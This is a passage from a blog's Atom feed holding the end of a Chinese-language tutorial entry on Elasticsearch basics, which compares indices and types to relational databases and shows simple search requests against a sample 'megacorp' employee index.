href="https://es.xiaoleilu.com/010_Intro/30_Tutorial_Search.html" target="_blank" rel="noopener">参考：Elasticsearch权威指南中文版</a><br><a href="https://blog.csdn.net/zhongzunfa/article/details/81147906" target="_blank" rel="noopener">错误解决参考</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在Elasticsearch中，文档归属于一种类型(type),而这些类型存在于索引(index)中，我们可以画一些简单的对比图来类比传统关系型数据库：&lt;br&gt;&lt;code&gt;Relational DB -&amp;gt; Databases -&amp;gt; Tables -&amp;gt; Rows -&amp;gt; Columns&lt;/code&gt;&lt;br&gt;&lt;code&gt;Elasticsearch -&amp;gt; Indices   -&amp;gt; Types  -&amp;gt; Documents -&amp;gt; Fields&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;搜索&quot;&gt;&lt;a href=&quot;#搜索&quot; class=&quot;headerlink&quot; title=&quot;搜索&quot;&gt;&lt;/a&gt;搜索&lt;/h3&gt;&lt;h4 id=&quot;简单搜索&quot;&gt;&lt;a href=&quot;#简单搜索&quot; class=&quot;headerlink&quot; title=&quot;简单搜索&quot;&gt;&lt;/a&gt;简单搜索&lt;/h4&gt;&lt;p&gt;通过执行HTTP GET请求并指出文档的“地址”——索引、类型和ID既可。根据这三部分信息，我们就可以返回原始JSON文档：&lt;br&gt;我们通过HTTP方法&lt;code&gt;GET&lt;/code&gt;来检索文档，同样的，我们可以使用&lt;code&gt;DELETE&lt;/code&gt;方法删除文档，使用&lt;code&gt;HEAD&lt;/code&gt;方法检查某文档是否存在。如果想更新已存在的文档，我们只需再&lt;code&gt;PUT&lt;/code&gt;一次。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;GET /megacorp/employee/_search&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;搜索全部文档，默认返回前10个结果，包含在hits数组中。&lt;br&gt;查询字符串搜索（姓氏中包含Smith的文档）&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;GET /megacorp/employee/_search?q=last_name:Smith&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Elasticsearch" scheme="https://s0lt.github.io/tags/Elasticsearch/"/>
    
  </entry>
  
</feed>
